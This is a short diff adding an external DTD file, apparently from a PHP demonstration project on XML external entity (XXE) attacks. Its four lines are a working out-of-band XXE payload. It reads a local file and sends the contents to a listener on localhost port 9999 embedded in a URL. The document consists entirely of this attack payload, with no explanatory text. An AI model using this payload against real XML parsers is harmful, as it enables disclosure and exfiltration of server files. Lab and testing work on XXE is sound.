@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///<PATHTOPROJECT>/PHPXXE/abc.txt">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://localhost:9999/%file;'>">
+%eval;
+%error;
